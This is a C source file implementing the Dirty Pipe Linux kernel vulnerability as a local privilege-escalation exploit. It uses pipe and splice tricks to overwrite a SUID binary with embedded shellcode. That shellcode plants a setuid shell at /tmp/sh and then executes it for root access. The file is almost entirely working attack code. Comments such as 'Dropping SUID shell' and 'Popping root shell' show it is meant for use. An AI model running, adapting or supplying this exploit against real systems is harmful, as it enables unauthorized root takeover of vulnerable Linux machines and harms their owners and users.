#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <stdint.h>
#include <errno.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

// ELF code to be injected
static const unsigned char ELF_CODE[] = {
    // ELF header and code for privilege escalation
    /* ELF Header */
    0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,
	0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
	0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,
	0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,
	0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,
	0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,
	0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,
	0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d,
	0x70, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e,
	0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,
	0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
	0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
	0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69,
	0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a,
	0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00,
	0x6a, 0x00, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0,
	0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00,
	0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
};

/**
 * Create a pipe and fill it with data to set the PIPE_BUF_FLAG_CAN_MERGE flag.
 */
static void prepare_pipe(int pipe_fds[2]) {
    if (pipe(pipe_fds) != 0) {
        perror("Failed to create pipe");
        exit(EXIT_FAILURE);
    }

    unsigned pipe_size = fcntl(pipe_fds[1], F_GETPIPE_SZ);
    if (pipe_size == (unsigned)-1) {
        perror("Failed to get pipe size");
        exit(EXIT_FAILURE);
    }

    char buffer[PAGE_SIZE] = {0};
    ssize_t bytes_written;

    // Fill the pipe to set the PIPE_BUF_FLAG_CAN_MERGE flag
    for (unsigned remaining = pipe_size; remaining > 0;) {
        bytes_written = write(pipe_fds[1], buffer, (remaining > sizeof(buffer)) ? sizeof(buffer) : remaining);
        if (bytes_written <= 0) {
            perror("Failed to write to pipe");
            exit(EXIT_FAILURE);
        }
        remaining -= bytes_written;
    }

    // Drain the pipe to free all buffers
    for (unsigned remaining = pipe_size; remaining > 0;) {
        bytes_written = read(pipe_fds[0], buffer, (remaining > sizeof(buffer)) ? sizeof(buffer) : remaining);
        if (bytes_written <= 0) {
            perror("Failed to read from pipe");
            exit(EXIT_FAILURE);
        }
        remaining -= bytes_written;
    }
}

/**
 * Exploit the Dirty Pipe vulnerability to overwrite file contents.
 * 
 * @param filename The file to be overwritten.
 * @param offset The offset in the file to start overwriting.
 * @param data The data to write.
 * @param length The length of the data to write.
 * @return 0 on success, -1 on failure.
 */
static int exploit_dirty_pipe(const char *filename, off_t offset, const uint8_t *data, size_t length) {
    int file_fd = open(filename, O_RDONLY);
    if (file_fd < 0) {
        perror("Failed to open file");
        return -1;
    }

    struct stat file_stat;
    if (fstat(file_fd, &file_stat) != 0) {
        perror("Failed to get file stats");
        close(file_fd);
        return -1;
    }

    int pipe_fds[2];
    prepare_pipe(pipe_fds);

    // Perform splice operation to add a reference to the page cache
    --offset;
    ssize_t bytes_spliced = splice(file_fd, &offset, pipe_fds[1], NULL, 1, 0);
    if (bytes_spliced < 0) {
        perror("Failed to splice file to pipe");
        close(file_fd);
        return -1;
    }
    if (bytes_spliced == 0) {
        fprintf(stderr, "Splice operation returned 0 bytes");
        close(file_fd);
        return -1;
    }

    // Write data into the pipe, which will overwrite the page cache
    ssize_t bytes_written = write(pipe_fds[1], data, length);
    if (bytes_written < 0) {
        perror("Failed to write data to pipe");
        close(file_fd);
        return -1;
    }
    if ((size_t)bytes_written < length) {
        fprintf(stderr, "Write operation short by %zu bytes\n", length - (size_t)bytes_written);
        close(file_fd);
        return -1;
    }

    close(file_fd);
    return 0;
}

/**
 * Main function for the exploit.
 */
int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <SUID_BINARY>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *suid_binary_path = argv[1];
    size_t elf_code_size = sizeof(ELF_CODE);

    // Backup the original binary
    int fd = open(suid_binary_path, O_RDONLY);
    if (fd < 0) {
        perror("Failed to open SUID binary");
        return EXIT_FAILURE;
    }

    uint8_t *original_bytes = malloc(elf_code_size);
    if (original_bytes == NULL) {
        perror("Failed to allocate memory for original bytes");
        close(fd);
        return EXIT_FAILURE;
    }

    lseek(fd, 1, SEEK_SET);
    if (read(fd, original_bytes, elf_code_size) != (ssize_t)elf_code_size) {
        perror("Failed to read original bytes");
        free(original_bytes);
        close(fd);
        return EXIT_FAILURE;
    }

    close(fd);

    // Exploit the Dirty Pipe vulnerability
    printf("[+] Hijacking SUID binary...\n");
    if (exploit_dirty_pipe(suid_binary_path, 1, ELF_CODE, elf_code_size) != 0) {
        fprintf(stderr, "[~] Exploit failed\n");
        free(original_bytes);
        return EXIT_FAILURE;
    }

    // Execute the hijacked binary to gain root access
    printf("[+] Dropping SUID shell...\n");
    system(suid_binary_path);

    // Restore the original binary
    printf("[+] Restoring SUID binary...\n");
    if (exploit_dirty_pipe(suid_binary_path, 1, original_bytes, elf_code_size) != 0) {
        fprintf(stderr, "[~] Restore failed\n");
        free(original_bytes);
        return EXIT_FAILURE;
    }

    free(original_bytes);

    // Execute a root shell
    printf("[+] Popping root shell... (remember to clean up /tmp/sh)\n");
    system("/tmp/sh");

    return EXIT_SUCCESS;
}
